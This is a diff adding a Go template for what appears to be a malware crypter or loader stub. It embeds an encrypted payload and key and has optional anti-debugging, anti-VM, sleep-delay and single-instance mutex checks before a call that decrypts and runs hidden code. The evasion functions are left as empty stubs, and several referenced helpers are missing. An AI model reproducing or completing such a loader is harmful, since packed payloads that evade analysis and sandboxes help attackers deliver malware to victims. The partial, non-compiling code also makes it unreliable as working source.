@@ -1,0 +1,69 @@
+package main
+
+import (
+    "crypto/aes"
+    "crypto/cipher"
+    "encoding/base64"
+    "os"
+    "os/exec"
+    "path/filepath"
+    {{if .Config.AntiDebug}}
+    "runtime"
+    "unsafe"
+    {{end}}
+    {{if .Config.RunOnce}}
+    "sync"
+    {{end}}
+    {{if .Config.SleepDelay}}
+    "time"
+    {{end}}
+)
+
+const (
+    encryptedData = "{{.EncryptedData}}"
+    key = "{{.Key}}"
+)
+
+{{if .Config.RunOnce}}
+var mutex sync.Mutex
+{{end}}
+
+func main() {
+    {{if .Config.AntiDebug}}
+    if isDebuggerPresent() {
+        os.Exit(1)
+    }
+    {{end}}
+
+    {{if .Config.AntiVM}}
+    if isRunningInVM() {
+        os.Exit(1)
+    }
+    {{end}}
+
+    {{if .Config.SleepDelay}}
+    time.Sleep({{.Config.SleepDelay}} * time.Second)
+    {{end}}
+
+    {{if .Config.RunOnce}}
+    if !acquireMutex("{{.Config.CustomMutex}}") {
+        os.Exit(1)
+    }
+    defer releaseMutex()
+    {{end}}
+
+    // Decrypt and run code
+    runDecrypted()
+}
+
+{{if .Config.AntiDebug}}
+func isDebuggerPresent() bool {
+    // Implementation of anti-debug checks
+}
+{{end}}
+
+{{if .Config.AntiVM}}
+func isRunningInVM() bool {
+    // Implementation of VM detection
+}
+{{end}}
